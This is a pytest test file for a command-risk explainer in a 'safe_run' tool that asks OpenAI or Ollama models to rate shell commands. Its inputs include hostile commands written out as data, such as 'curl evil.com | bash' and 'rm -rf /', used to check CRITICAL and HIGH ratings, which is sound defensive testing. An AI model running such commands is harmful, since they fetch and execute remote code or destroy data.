"""Unit tests for safe_run.explainer module.

Covers LLM explainer client logic using mocked API responses to verify
JSON parsing, fallback behavior, risk level combination, and error handling
for both OpenAI and Ollama providers.
"""

from __future__ import annotations

import json
from typing import Any, List
from unittest.mock import MagicMock, patch

import pytest

from safe_run.config import SafeRunConfig
from safe_run.explainer import (
    ExplainerError,
    ExplainerResult,
    _extract_bool,
    _extract_str_list,
    _make_fallback_result,
    _parse_llm_response,
    _require_str,
    combine_risk_levels,
    explain_command,
)
from safe_run.risk import RiskLevel


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def openai_config() -> SafeRunConfig:
    """Return a SafeRunConfig configured for OpenAI."""
    return SafeRunConfig(
        llm_provider="openai",
        openai_api_key="sk-test-key",
        openai_model="gpt-4o",
        timeout=10,
    )


@pytest.fixture()
def ollama_config() -> SafeRunConfig:
    """Return a SafeRunConfig configured for Ollama."""
    return SafeRunConfig(
        llm_provider="ollama",
        ollama_model="llama3",
        ollama_base_url="http://localhost:11434/v1",
        timeout=10,
    )


def _make_valid_json_response(
    explanation: str = "Lists files in the current directory.",
    risk_level: str = "LOW",
    risk_reason: str = "Read-only operation.",
    effects: list[str] | None = None,
    reversible: bool = True,
) -> str:
    """Build a valid JSON response string as the LLM would return."""
    return json.dumps({
        "explanation": explanation,
        "risk_level": risk_level,
        "risk_reason": risk_reason,
        "effects": effects or ["Displays file listing"],
        "reversible": reversible,
    })


def _mock_openai_response(content: str) -> MagicMock:
    """Create a mock OpenAI chat completion response object."""
    choice = MagicMock()
    choice.message.content = content
    response = MagicMock()
    response.choices = [choice]
    return response


# ---------------------------------------------------------------------------
# _require_str
# ---------------------------------------------------------------------------


class TestRequireStr:
    def test_returns_string_value(self) -> None:
        assert _require_str({"key": "hello"}, "key") == "hello"

    def test_returns_empty_string_for_missing_key(self) -> None:
        assert _require_str({}, "key") == ""

    def test_coerces_int_to_str(self) -> None:
        result = _require_str({"key": 42}, "key")
        assert result == "42"

    def test_returns_empty_for_none_value(self) -> None:
        result = _require_str({"key": None}, "key")
        assert result == ""

    def test_returns_empty_string_value_as_is(self) -> None:
        assert _require_str({"key": ""}, "key") == ""

    def test_returns_multiword_string(self) -> None:
        result = _require_str({"key": "hello world"}, "key")
        assert result == "hello world"

    def test_coerces_float_to_str(self) -> None:
        result = _require_str({"key": 3.14}, "key")
        assert "3" in result

    def test_coerces_list_to_str(self) -> None:
        # Lists are coerced via str()
        result = _require_str({"key": ["a", "b"]}, "key")
        assert isinstance(result, str)


# ---------------------------------------------------------------------------
# _extract_bool
# ---------------------------------------------------------------------------


class TestExtractBool:
    def test_true_bool(self) -> None:
        assert _extract_bool({"k": True}, "k") is True

    def test_false_bool(self) -> None:
        assert _extract_bool({"k": False}, "k") is False

    def test_missing_defaults_false(self) -> None:
        assert _extract_bool({}, "k") is False

    def test_true_string(self) -> None:
        assert _extract_bool({"k": "true"}, "k") is True

    def test_false_string(self) -> None:
        assert _extract_bool({"k": "false"}, "k") is False

    def test_yes_string(self) -> None:
        assert _extract_bool({"k": "yes"}, "k") is True

    def test_nonzero_int_truthy(self) -> None:
        assert _extract_bool({"k": 1}, "k") is True

    def test_zero_int_falsy(self) -> None:
        assert _extract_bool({"k": 0}, "k") is False

    def test_string_1_truthy(self) -> None:
        assert _extract_bool({"k": "1"}, "k") is True

    def test_none_value_falsy(self) -> None:
        # None is not a bool, should evaluate to falsy
        result = _extract_bool({"k": None}, "k")
        assert result is False


# ---------------------------------------------------------------------------
# _extract_str_list
# ---------------------------------------------------------------------------


class TestExtractStrList:
    def test_returns_list_of_strings(self) -> None:
        result = _extract_str_list({"k": ["a", "b"]}, "k")
        assert result == ["a", "b"]

    def test_missing_returns_empty_list(self) -> None:
        assert _extract_str_list({}, "k") == []

    def test_non_list_returns_empty(self) -> None:
        assert _extract_str_list({"k": "not a list"}, "k") == []

    def test_coerces_non_string_items(self) -> None:
        result = _extract_str_list({"k": [1, 2, 3]}, "k")
        assert result == ["1", "2", "3"]

    def test_filters_none_items(self) -> None:
        result = _extract_str_list({"k": ["a", None, "b"]}, "k")
        assert "a" in result
        assert "b" in result

    def test_empty_list_returns_empty(self) -> None:
        assert _extract_str_list({"k": []}, "k") == []

    def test_single_item_list(self) -> None:
        result = _extract_str_list({"k": ["only one"]}, "k")
        assert result == ["only one"]

    def test_dict_value_returns_empty(self) -> None:
        result = _extract_str_list({"k": {"a": "b"}}, "k")
        assert result == []

    def test_integer_value_returns_empty(self) -> None:
        result = _extract_str_list({"k": 42}, "k")
        assert result == []


# ---------------------------------------------------------------------------
# _parse_llm_response
# ---------------------------------------------------------------------------


class TestParseLLMResponse:
    def test_parses_valid_json(self) -> None:
        raw = _make_valid_json_response()
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert isinstance(result, ExplainerResult)
        assert result.explanation == "Lists files in the current directory."

    def test_parses_risk_level_low(self) -> None:
        raw = _make_valid_json_response(risk_level="LOW")
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.llm_risk_level == RiskLevel.LOW

    def test_parses_risk_level_critical(self) -> None:
        raw = _make_valid_json_response(risk_level="CRITICAL", reversible=False)
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.llm_risk_level == RiskLevel.CRITICAL

    def test_parses_risk_level_medium(self) -> None:
        raw = _make_valid_json_response(risk_level="MEDIUM")
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.llm_risk_level == RiskLevel.MEDIUM

    def test_parses_risk_level_high(self) -> None:
        raw = _make_valid_json_response(risk_level="HIGH", reversible=False)
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.llm_risk_level == RiskLevel.HIGH

    def test_strips_markdown_code_fence(self) -> None:
        raw = "```json\n" + _make_valid_json_response() + "\n```"
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.llm_risk_level == RiskLevel.LOW

    def test_strips_plain_code_fence(self) -> None:
        raw = "```\n" + _make_valid_json_response() + "\n```"
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.explanation == "Lists files in the current directory."

    def test_provider_populated(self) -> None:
        raw = _make_valid_json_response()
        result = _parse_llm_response(raw, "ollama", "llama3")
        assert result.provider_used == "ollama"

    def test_model_populated(self) -> None:
        raw = _make_valid_json_response()
        result = _parse_llm_response(raw, "openai", "gpt-4o-mini")
        assert result.model_used == "gpt-4o-mini"

    def test_effects_populated(self) -> None:
        raw = _make_valid_json_response(effects=["Shows files", "No writes"])
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert "Shows files" in result.effects

    def test_reversible_true(self) -> None:
        raw = _make_valid_json_response(reversible=True)
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.reversible is True

    def test_reversible_false(self) -> None:
        raw = _make_valid_json_response(reversible=False)
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.reversible is False

    def test_raw_response_stored(self) -> None:
        raw = _make_valid_json_response()
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.raw_response == raw

    def test_no_error_on_success(self) -> None:
        raw = _make_valid_json_response()
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.error is None
        assert not result.is_fallback

    def test_invalid_json_raises_value_error(self) -> None:
        with pytest.raises(ValueError, match="invalid JSON"):
            _parse_llm_response("not json at all", "openai", "gpt-4o")

    def test_json_array_raises_value_error(self) -> None:
        with pytest.raises(ValueError, match="JSON object"):
            _parse_llm_response("[1, 2, 3]", "openai", "gpt-4o")

    def test_unknown_risk_level_defaults_to_high(self) -> None:
        raw = _make_valid_json_response(risk_level="EXTREME")
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.llm_risk_level == RiskLevel.HIGH

    def test_lowercase_risk_level_accepted(self) -> None:
        raw = _make_valid_json_response(risk_level="low")
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.llm_risk_level == RiskLevel.LOW

    def test_risk_reason_populated(self) -> None:
        raw = _make_valid_json_response(risk_reason="No writes to disk.")
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.risk_reason == "No writes to disk."

    def test_effects_is_list(self) -> None:
        raw = _make_valid_json_response(effects=["effect one", "effect two"])
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert isinstance(result.effects, list)

    def test_empty_effects_list(self) -> None:
        raw = _make_valid_json_response(effects=[])
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.effects == []

    def test_mixed_case_risk_level(self) -> None:
        raw = _make_valid_json_response(risk_level="High")
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.llm_risk_level == RiskLevel.HIGH

    def test_whitespace_stripped_from_response(self) -> None:
        raw = "  " + _make_valid_json_response() + "  "
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.llm_risk_level == RiskLevel.LOW

    def test_empty_string_raises_value_error(self) -> None:
        with pytest.raises(ValueError):
            _parse_llm_response("", "openai", "gpt-4o")

    def test_json_with_extra_keys_accepted(self) -> None:
        data = {
            "explanation": "Does something.",
            "risk_level": "LOW",
            "risk_reason": "Safe.",
            "effects": ["No effect"],
            "reversible": True,
            "extra_unknown_key": "ignored value",
        }
        raw = json.dumps(data)
        result = _parse_llm_response(raw, "openai", "gpt-4o")
        assert result.llm_risk_level == RiskLevel.LOW


# ---------------------------------------------------------------------------
# _make_fallback_result
# ---------------------------------------------------------------------------


class TestMakeFallbackResult:
    def test_is_fallback_true(self) -> None:
        result = _make_fallback_result("ls", "test error", "openai", "gpt-4o")
        assert result.is_fallback is True

    def test_error_message_stored(self) -> None:
        result = _make_fallback_result("ls", "timeout", "openai", "gpt-4o")
        assert "timeout" in result.error  # type: ignore[operator]

    def test_explanation_mentions_command(self) -> None:
        result = _make_fallback_result("ls -la", "error", "openai", "gpt-4o")
        assert "ls -la" in result.explanation

    def test_risk_level_is_high(self) -> None:
        result = _make_fallback_result("ls", "error", "openai", "gpt-4o")
        assert result.llm_risk_level == RiskLevel.HIGH

    def test_reversible_is_false(self) -> None:
        result = _make_fallback_result("ls", "error", "openai", "gpt-4o")
        assert result.reversible is False

    def test_provider_used_stored(self) -> None:
        result = _make_fallback_result("ls", "error", "ollama", "llama3")
        assert result.provider_used == "ollama"

    def test_model_used_stored(self) -> None:
        result = _make_fallback_result("ls", "error", "openai", "gpt-4o")
        assert result.model_used == "gpt-4o"

    def test_long_command_truncated_in_explanation(self) -> None:
        long_cmd = "x" * 200
        result = _make_fallback_result(long_cmd, "error", "openai", "gpt-4o")
        assert "..." in result.explanation

    def test_short_command_not_truncated(self) -> None:
        cmd = "ls -la"
        result = _make_fallback_result(cmd, "error", "openai", "gpt-4o")
        assert "..." not in result.explanation

    def test_effects_non_empty(self) -> None:
        result = _make_fallback_result("ls", "error", "openai", "gpt-4o")
        assert isinstance(result.effects, list)
        assert len(result.effects) > 0

    def test_risk_reason_non_empty(self) -> None:
        result = _make_fallback_result("ls", "error", "openai", "gpt-4o")
        assert result.risk_reason
        assert isinstance(result.risk_reason, str)

    def test_explanation_non_empty(self) -> None:
        result = _make_fallback_result("ls", "error", "openai", "gpt-4o")
        assert result.explanation

    def test_ollama_model_stored(self) -> None:
        result = _make_fallback_result("ls", "error", "ollama", "mistral")
        assert result.model_used == "mistral"

    def test_empty_error_message(self) -> None:
        result = _make_fallback_result("ls", "", "openai", "gpt-4o")
        assert result.is_fallback is True


# ---------------------------------------------------------------------------
# combine_risk_levels
# ---------------------------------------------------------------------------


class TestCombineRiskLevels:
    def test_same_levels_returns_that_level(self) -> None:
        assert combine_risk_levels(RiskLevel.HIGH, RiskLevel.HIGH) == RiskLevel.HIGH

    def test_rule_higher_returns_rule(self) -> None:
        assert combine_risk_levels(RiskLevel.CRITICAL, RiskLevel.LOW) == RiskLevel.CRITICAL

    def test_llm_higher_returns_llm(self) -> None:
        assert combine_risk_levels(RiskLevel.LOW, RiskLevel.HIGH) == RiskLevel.HIGH

    def test_medium_vs_high_returns_high(self) -> None:
        assert combine_risk_levels(RiskLevel.MEDIUM, RiskLevel.HIGH) == RiskLevel.HIGH

    def test_critical_always_wins_as_rule(self) -> None:
        for level in RiskLevel:
            assert combine_risk_levels(RiskLevel.CRITICAL, level) == RiskLevel.CRITICAL

    def test_critical_always_wins_as_llm(self) -> None:
        for level in RiskLevel:
            assert combine_risk_levels(level, RiskLevel.CRITICAL) == RiskLevel.CRITICAL

    def test_low_vs_low_returns_low(self) -> None:
        assert combine_risk_levels(RiskLevel.LOW, RiskLevel.LOW) == RiskLevel.LOW

    def test_medium_vs_medium_returns_medium(self) -> None:
        assert combine_risk_levels(RiskLevel.MEDIUM, RiskLevel.MEDIUM) == RiskLevel.MEDIUM

    def test_low_vs_medium_returns_medium(self) -> None:
        assert combine_risk_levels(RiskLevel.LOW, RiskLevel.MEDIUM) == RiskLevel.MEDIUM

    def test_high_vs_medium_returns_high(self) -> None:
        assert combine_risk_levels(RiskLevel.HIGH, RiskLevel.MEDIUM) == RiskLevel.HIGH

    def test_returns_risk_level_instance(self) -> None:
        result = combine_risk_levels(RiskLevel.LOW, RiskLevel.HIGH)
        assert isinstance(result, RiskLevel)


# ---------------------------------------------------------------------------
# ExplainerResult properties
# ---------------------------------------------------------------------------


class TestExplainerResultProperties:
    def _make_result(
        self,
        provider: str = "openai",
        model: str = "gpt-4o",
        error: str | None = None,
        risk_level: RiskLevel = RiskLevel.LOW,
        reversible: bool = True,
    ) -> ExplainerResult:
        return ExplainerResult(
            explanation="Does something.",
            llm_risk_level=risk_level,
            risk_reason="Safe operation.",
            effects=["No side effects"],
            reversible=reversible,
            provider_used=provider,
            model_used=model,
            error=error,
        )

    def test_is_fallback_false_when_no_error(self) -> None:
        assert not self._make_result().is_fallback

    def test_is_fallback_true_when_error_set(self) -> None:
        assert self._make_result(error="API down").is_fallback

    def test_provider_used_preserved(self) -> None:
        result = self._make_result(provider="ollama")
        assert result.provider_used == "ollama"

    def test_model_used_preserved(self) -> None:
        result = self._make_result(model="llama3")
        assert result.model_used == "llama3"

    def test_risk_level_preserved(self) -> None:
        result = self._make_result(risk_level=RiskLevel.CRITICAL)
        assert result.llm_risk_level == RiskLevel.CRITICAL

    def test_reversible_preserved(self) -> None:
        result = self._make_result(reversible=False)
        assert result.reversible is False

    def test_error_message_preserved(self) -> None:
        result = self._make_result(error="connection refused")
        assert result.error == "connection refused"

    def test_effects_field_preserved(self) -> None:
        result = self._make_result()
        assert "No side effects" in result.effects

    def test_raw_response_default_empty(self) -> None:
        result = self._make_result()
        assert result.raw_response == ""

    def test_explanation_field_preserved(self) -> None:
        result = self._make_result()
        assert result.explanation == "Does something."

    def test_risk_reason_preserved(self) -> None:
        result = self._make_result()
        assert result.risk_reason == "Safe operation."


# ---------------------------------------------------------------------------
# explain_command — success paths (mocked)
# ---------------------------------------------------------------------------


class TestExplainCommandSuccess:
    def test_openai_provider_success(
        self, openai_config: SafeRunConfig
    ) -> None:
        valid_json = _make_valid_json_response(
            explanation="Lists directory contents.",
            risk_level="LOW",
        )

        with patch("safe_run.explainer._call_llm", return_value=valid_json):
            result = explain_command("ls -la", openai_config)

        assert result.llm_risk_level == RiskLevel.LOW
        assert result.provider_used == "openai"
        assert not result.is_fallback

    def test_ollama_provider_success(
        self, ollama_config: SafeRunConfig
    ) -> None:
        valid_json = _make_valid_json_response(
            explanation="Removes a file.",
            risk_level="MEDIUM",
            reversible=False,
        )

        with patch("safe_run.explainer._call_llm", return_value=valid_json):
            result = explain_command("rm file.txt", ollama_config)

        assert result.provider_used == "ollama"
        assert result.llm_risk_level == RiskLevel.MEDIUM
        assert not result.is_fallback

    def test_result_contains_explanation(
        self, openai_config: SafeRunConfig
    ) -> None:
        valid_json = _make_valid_json_response(
            explanation="Prints working directory."
        )
        with patch("safe_run.explainer._call_llm", return_value=valid_json):
            result = explain_command("pwd", openai_config)

        assert "Prints working directory." in result.explanation

    def test_result_contains_effects(
        self, openai_config: SafeRunConfig
    ) -> None:
        valid_json = _make_valid_json_response(
            effects=["Shows current path"]
        )
        with patch("safe_run.explainer._call_llm", return_value=valid_json):
            result = explain_command("pwd", openai_config)

        assert "Shows current path" in result.effects

    def test_reversible_preserved(
        self, openai_config: SafeRunConfig
    ) -> None:
        valid_json = _make_valid_json_response(reversible=False)
        with patch("safe_run.explainer._call_llm", return_value=valid_json):
            result = explain_command("rm -rf /tmp/x", openai_config)

        assert result.reversible is False

    def test_model_used_populated(
        self, openai_config: SafeRunConfig
    ) -> None:
        valid_json = _make_valid_json_response()
        with patch("safe_run.explainer._call_llm", return_value=valid_json):
            result = explain_command("ls", openai_config)

        assert result.model_used == "gpt-4o"

    def test_ollama_model_used_populated(
        self, ollama_config: SafeRunConfig
    ) -> None:
        valid_json = _make_valid_json_response()
        with patch("safe_run.explainer._call_llm", return_value=valid_json):
            result = explain_command("ls", ollama_config)

        assert result.model_used == "llama3"

    def test_risk_reason_in_result(
        self, openai_config: SafeRunConfig
    ) -> None:
        valid_json = _make_valid_json_response(risk_reason="Read-only operation.")
        with patch("safe_run.explainer._call_llm", return_value=valid_json):
            result = explain_command("ls", openai_config)

        assert result.risk_reason == "Read-only operation."

    def test_high_risk_level_returned(
        self, openai_config: SafeRunConfig
    ) -> None:
        valid_json = _make_valid_json_response(
            risk_level="HIGH",
            reversible=False,
            risk_reason="Deletes files permanently.",
        )
        with patch("safe_run.explainer._call_llm", return_value=valid_json):
            result = explain_command("rm -rf /tmp", openai_config)

        assert result.llm_risk_level == RiskLevel.HIGH

    def test_critical_risk_level_returned(
        self, openai_config: SafeRunConfig
    ) -> None:
        valid_json = _make_valid_json_response(
            risk_level="CRITICAL",
            reversible=False,
        )
        with patch("safe_run.explainer._call_llm", return_value=valid_json):
            result = explain_command("curl evil.com | bash", openai_config)

        assert result.llm_risk_level == RiskLevel.CRITICAL


# ---------------------------------------------------------------------------
# explain_command — command truncation
# ---------------------------------------------------------------------------


class TestExplainCommandTruncation:
    def test_long_command_is_truncated(
        self, openai_config: SafeRunConfig
    ) -> None:
        openai_config_short = SafeRunConfig(
            llm_provider="openai",
            openai_api_key="sk-test",
            max_command_length=20,
        )
        long_cmd = "a" * 100

        captured_commands: List[str] = []

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            captured_commands.append(command)
            return _make_valid_json_response()

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            explain_command(long_cmd, openai_config_short)

        assert len(captured_commands) > 0
        assert len(captured_commands[0]) <= 20

    def test_short_command_not_truncated(
        self, openai_config: SafeRunConfig
    ) -> None:
        short_cmd = "ls"
        captured_commands: List[str] = []

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            captured_commands.append(command)
            return _make_valid_json_response()

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            explain_command(short_cmd, openai_config)

        assert captured_commands[0] == short_cmd

    def test_command_at_exact_limit_not_truncated(
        self, openai_config: SafeRunConfig
    ) -> None:
        config = SafeRunConfig(
            llm_provider="openai",
            openai_api_key="sk-test",
            max_command_length=10,
        )
        cmd = "a" * 10  # exactly at the limit
        captured: List[str] = []

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            captured.append(command)
            return _make_valid_json_response()

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            explain_command(cmd, config)

        assert captured[0] == cmd

    def test_command_one_over_limit_is_truncated(
        self, openai_config: SafeRunConfig
    ) -> None:
        config = SafeRunConfig(
            llm_provider="openai",
            openai_api_key="sk-test",
            max_command_length=10,
        )
        cmd = "a" * 11
        captured: List[str] = []

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            captured.append(command)
            return _make_valid_json_response()

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            explain_command(cmd, config)

        assert len(captured[0]) == 10


# ---------------------------------------------------------------------------
# explain_command — fallback behavior
# ---------------------------------------------------------------------------


class TestExplainCommandFallback:
    def test_falls_back_to_ollama_on_openai_error(
        self, openai_config: SafeRunConfig
    ) -> None:
        from openai import APIConnectionError as OAIConnError

        valid_json = _make_valid_json_response(
            explanation="Fallback explanation."
        )
        call_count = 0

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            nonlocal call_count
            call_count += 1
            if call_count == 1:
                raise OAIConnError(request=MagicMock())
            return valid_json

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            result = explain_command("ls", openai_config, allow_fallback=True)

        assert result.provider_used == "ollama"
        assert result.is_fallback  # error field set to describe the fallback

    def test_falls_back_to_openai_on_ollama_error(
        self, ollama_config: SafeRunConfig
    ) -> None:
        from openai import APIConnectionError as OAIConnError

        valid_json = _make_valid_json_response()
        call_count = 0

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            nonlocal call_count
            call_count += 1
            if call_count == 1:
                raise OAIConnError(request=MagicMock())
            return valid_json

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            result = explain_command("ls", ollama_config, allow_fallback=True)

        assert result.provider_used == "openai"

    def test_both_providers_fail_returns_fallback_result(
        self, openai_config: SafeRunConfig
    ) -> None:
        from openai import APIConnectionError as OAIConnError

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            raise OAIConnError(request=MagicMock())

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            result = explain_command("ls", openai_config, allow_fallback=True)

        assert result.is_fallback
        assert result.llm_risk_level == RiskLevel.HIGH

    def test_no_fallback_when_disabled(
        self, openai_config: SafeRunConfig
    ) -> None:
        from openai import APIConnectionError as OAIConnError

        call_count = 0

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            nonlocal call_count
            call_count += 1
            raise OAIConnError(request=MagicMock())

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            result = explain_command(
                "ls", openai_config, allow_fallback=False
            )

        # Only the primary should have been tried
        assert call_count == 1
        assert result.is_fallback

    def test_fallback_result_contains_both_error_messages(
        self, openai_config: SafeRunConfig
    ) -> None:
        from openai import APIConnectionError as OAIConnError

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            raise OAIConnError(request=MagicMock())

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            result = explain_command("ls", openai_config, allow_fallback=True)

        assert result.error is not None
        # Both providers should be mentioned
        assert "openai" in result.error.lower() or "ollama" in result.error.lower()

    def test_malformed_json_triggers_fallback_to_second_provider(
        self, openai_config: SafeRunConfig
    ) -> None:
        call_count = 0
        valid_json = _make_valid_json_response()

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            nonlocal call_count
            call_count += 1
            if call_count == 1:
                return "this is not json at all"
            return valid_json

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            result = explain_command("ls", openai_config, allow_fallback=True)

        assert result.provider_used == "ollama"

    def test_fallback_result_has_is_fallback_true(
        self, openai_config: SafeRunConfig
    ) -> None:
        from openai import APIConnectionError as OAIConnError

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            raise OAIConnError(request=MagicMock())

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            result = explain_command("rm -rf /", openai_config, allow_fallback=True)

        assert result.is_fallback is True

    def test_fallback_explanation_not_empty(
        self, openai_config: SafeRunConfig
    ) -> None:
        from openai import APIConnectionError as OAIConnError

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            raise OAIConnError(request=MagicMock())

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            result = explain_command("ls", openai_config, allow_fallback=True)

        assert result.explanation
        assert len(result.explanation) > 0

    def test_successful_fallback_includes_primary_error_in_error_field(
        self, openai_config: SafeRunConfig
    ) -> None:
        """When primary fails but fallback succeeds, error field describes the situation."""
        from openai import APIConnectionError as OAIConnError

        valid_json = _make_valid_json_response()
        call_count = 0

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            nonlocal call_count
            call_count += 1
            if call_count == 1:
                raise OAIConnError(request=MagicMock())
            return valid_json

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            result = explain_command("ls", openai_config, allow_fallback=True)

        # The successful fallback should have error set to explain what happened
        assert result.error is not None
        assert "openai" in result.error.lower() or "ollama" in result.error.lower()


# ---------------------------------------------------------------------------
# explain_command — error types
# ---------------------------------------------------------------------------


class TestExplainCommandErrorTypes:
    def test_auth_error_triggers_explainer_error_on_primary(
        self, openai_config: SafeRunConfig
    ) -> None:
        from openai import AuthenticationError

        mock_resp = MagicMock()
        mock_resp.status_code = 401
        mock_resp.json.return_value = {"error": {"message": "Unauthorized"}}
        mock_resp.headers = {}

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            raise AuthenticationError(
                message="Invalid API key",
                response=mock_resp,
                body={"error": {"message": "Invalid API key"}},
            )

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            result = explain_command(
                "ls", openai_config, allow_fallback=False
            )

        assert result.is_fallback

    def test_timeout_error_returns_fallback(
        self, openai_config: SafeRunConfig
    ) -> None:
        from openai import APITimeoutError

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            raise APITimeoutError(request=MagicMock())

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            result = explain_command(
                "ls", openai_config, allow_fallback=False
            )

        assert result.is_fallback
        assert result.llm_risk_level == RiskLevel.HIGH

    def test_connection_error_returns_fallback(
        self, openai_config: SafeRunConfig
    ) -> None:
        from openai import APIConnectionError as OAIConnError

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            raise OAIConnError(request=MagicMock())

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            result = explain_command(
                "ls", openai_config, allow_fallback=False
            )

        assert result.is_fallback

    def test_generic_openai_error_returns_fallback(
        self, openai_config: SafeRunConfig
    ) -> None:
        from openai import OpenAIError

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            raise OpenAIError("Some generic error")

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            result = explain_command(
                "ls", openai_config, allow_fallback=False
            )

        assert result.is_fallback

    def test_timeout_error_on_ollama_returns_fallback(
        self, ollama_config: SafeRunConfig
    ) -> None:
        from openai import APITimeoutError

        def mock_call_llm(
            client: Any, model: str, command: str, timeout: int
        ) -> str:
            raise APITimeoutError(request=MagicMock())

        with patch("safe_run.explainer._call_llm", side_effect=mock_call_llm):
            result = explain_command(
                "ls", ollama_config, allow_fallback=False
            )

        assert result.is_fallback
        assert result.llm_risk_level == RiskLevel.HIGH


# ---------------------------------------------------------------------------
# explain_command — code fence stripping integration
# ---------------------------------------------------------------------------


class TestExplainCommandCodeFenceStripping:
    def test_response_with_code_fence_parsed_correctly(
        self, openai_config: SafeRunConfig
    ) -> None:
        inner = _make_valid_json_response(
            explanation="Runs a script.", risk_level="HIGH"
        )
        fenced = f"```json\n{inner}\n```"

        with patch("safe_run.explainer._call_llm", return_value=fenced):
            result = explain_command("./script.sh", openai_config)

        assert result.llm_risk_level == RiskLevel.HIGH
        assert "Runs a script." in result.explanation

    def test_response_with_plain_code_fence_parsed_correctly(
        self, openai_config: SafeRunConfig
    ) -> None:
        inner = _make_valid_json_response(
            explanation="Downloads a file.", risk_level="LOW"
        )
        fenced = f"```\n{inner}\n```"

        with patch("safe_run.explainer._call_llm", return_value=fenced):
            result = explain_command("wget https://example.com/file", openai_config)

        assert result.llm_risk_level == RiskLevel.LOW
        assert "Downloads a file." in result.explanation

    def test_response_with_leading_whitespace_parsed(
        self, openai_config: SafeRunConfig
    ) -> None:
        inner = _make_valid_json_response(explanation="Does stuff.")
        padded = "   " + inner + "   "

        with patch("safe_run.explainer._call_llm", return_value=padded):
            result = explain_command("ls", openai_config)

        assert "Does stuff." in result.explanation


# ---------------------------------------------------------------------------
# ExplainerError
# ---------------------------------------------------------------------------


class TestExplainerError:
    def test_is_exception(self) -> None:
        err = ExplainerError("test error")
        assert isinstance(err, Exception)

    def test_message_preserved(self) -> None:
        err = ExplainerError("connection failed")
        assert "connection failed" in str(err)

    def test_can_be_raised_and_caught(self) -> None:
        with pytest.raises(ExplainerError, match="test"):
            raise ExplainerError("test")


# ---------------------------------------------------------------------------
# Integration: explain_command with various command strings
# ---------------------------------------------------------------------------


class TestExplainCommandIntegration:
    def test_dangerous_command_gets_critical_explanation(
        self, openai_config: SafeRunConfig
    ) -> None:
        valid_json = _make_valid_json_response(
            explanation="Destroys root filesystem.",
            risk_level="CRITICAL",
            reversible=False,
            risk_reason="Irreversible system destruction.",
        )
        with patch("safe_run.explainer._call_llm", return_value=valid_json):
            result = explain_command("rm -rf /", openai_config)

        assert result.llm_risk_level == RiskLevel.CRITICAL
        assert not result.reversible

    def test_safe_command_gets_low_explanation(
        self, openai_config: SafeRunConfig
    ) -> None:
        valid_json = _make_valid_json_response(
            explanation="Lists directory contents.",
            risk_level="LOW",
            reversible=True,
        )
        with patch("safe_run.explainer._call_llm", return_value=valid_json):
            result = explain_command("ls -la", openai_config)

        assert result.llm_risk_level == RiskLevel.LOW
        assert result.reversible is True

    def test_multiple_effects_returned(
        self, openai_config: SafeRunConfig
    ) -> None:
        effects = ["Writes to disk", "Changes permissions", "Logs to syslog"]
        valid_json = _make_valid_json_response(
            effects=effects, risk_level="MEDIUM"
        )
        with patch("safe_run.explainer._call_llm", return_value=valid_json):
            result = explain_command("some command", openai_config)

        assert len(result.effects) == 3
        assert "Writes to disk" in result.effects
        assert "Changes permissions" in result.effects
        assert "Logs to syslog" in result.effects

